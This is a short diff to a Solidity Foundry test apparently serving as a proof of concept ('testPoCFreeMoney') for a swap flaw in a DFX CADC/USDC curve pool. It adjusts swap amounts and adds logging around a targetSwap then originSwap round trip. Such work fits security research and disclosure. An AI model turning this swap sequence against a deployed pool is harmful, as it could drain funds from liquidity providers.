@@ -302,7 +302,8 @@ contract CurveFactoryV2Test is Test {
     function testPoCFreeMoney() public { 
         // set this for no fuzzing 
         uint256 price = 191427874;
-        uint256 amounts = 249741435547872736176450;
+        uint256 amounts = 249741435547872736176;
+        // uint256 amounts = 249741435547872736176450;
         
         // cheats.assume(price > 10 ** 8);
         // cheats.assume(price < 4 * 10 ** 8);
@@ -325,11 +326,14 @@ contract CurveFactoryV2Test is Test {
         cheats.stopPrank();
         
         cheats.startPrank(address(swapper));
-        deal(address(usdc), address(swapper), 1500000e6);
+        deal(address(usdc), address(swapper), 1_500_000e6);
+        // deal(address(cadc), address(swapper), 1_500_000e18);
         cadc.approve(address(dfxCadcCurve), type(uint256).max);
         usdc.approve(address(dfxCadcCurve), type(uint256).max);
         uint256 amountReal = dfxCadcCurve.targetSwap(address(usdc), address(cadc), type(uint256).max, amounts, block.timestamp + 60);
+        console.log(amountReal);
         uint256 amountRecv = dfxCadcCurve.originSwap(address(cadc), address(usdc), cadc.balanceOf(address(swapper)), 0, block.timestamp + 60);
+        console.log(amountRecv);
         cheats.stopPrank();
         
         emit log_named_uint("USDC balance of swapper",
